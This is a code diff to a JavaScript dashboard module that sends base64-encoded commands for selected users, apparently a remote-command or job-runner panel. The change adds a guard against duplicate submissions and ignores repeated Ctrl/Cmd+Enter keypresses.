@@ -472,7 +472,9 @@ const RunApp = (() => {
     }
 
     // ── Send / fetch ──
+    let isSendingCommand = false;
     async function doSendPopup() {
+        if (isSendingCommand) return;
         const user = runState.popupUser, mode = runState.popupMode;
         const val = $('popup-input').value.trim();
         if (!user) return;
@@ -491,6 +493,7 @@ const RunApp = (() => {
         }
 
         if (!rawCmd && mode !== 'cmd') { closePopup(); return; }
+        isSendingCommand = true;
         const body = {
             username: user.username,
             cmd: rawCmd ? btoa(rawCmd) : '',
@@ -505,7 +508,9 @@ const RunApp = (() => {
             });
             if (!res.ok) return;
             closePopup(); fetchData();
-        } catch { }
+        } catch { } finally {
+            isSendingCommand = false;
+        }
     }
 
     async function doViewOutput(user) {
@@ -770,7 +775,12 @@ const RunApp = (() => {
         $('tab-autofill-hint').addEventListener('click', () => { taInput.focus(); autofillPopupInput(); });
         $('tab-unfocus-hint').addEventListener('click', unfocusPopupInput);
         taInput.addEventListener('keydown', e => {
-            if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) { e.preventDefault(); doSendPopup(); }
+            if (e.key === 'Enter' && (e.ctrlKey || e.metaKey)) {
+                e.preventDefault();
+                e.stopPropagation();
+                if (e.repeat) return;
+                doSendPopup();
+            }
             if (e.key === 'Tab') {
                 e.preventDefault();
                 if (e.shiftKey) unfocusPopupInput();
